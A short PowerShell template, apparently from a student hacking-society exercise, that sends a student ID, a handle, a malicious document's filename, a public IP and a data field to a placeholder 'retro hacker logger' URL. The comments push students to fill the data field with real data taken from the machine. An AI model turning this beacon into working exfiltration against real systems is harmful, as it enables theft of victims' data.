## Replace this with the post URL we're talking about
$serviceUrl = "https://flemingcollegehackerysociety.com/invalid"

# Required payload keys for the retro hacker logger.
# student_id
# hacker_handle
# filename
# public_ip
# data - Like... ACTUAL DATA.  USE SOME POWERSHELL AND MAKE IT WORK


$publicIp = '10.10.10.10'

$studentId = Read-Host "Enter student ID"
$hackerHandle = Read-Host "Enter hacker handle"
$filename = Read-Host "Enter your malicious documents filename"

# You might want to change this... don't be lazy
$dataValue = "I PROUDLY copy/paste from the internet!"

$payload = @{
    student_id = $studentId
    hacker_handle = $hackerHandle
    filename = $filename
    public_ip = $publicIp
    data = $dataValue
}
#PSSSTTT.... NO SPOILERS... BBBUUTTTTTT:::  $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing).Trim()

$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType "application/json"

$response
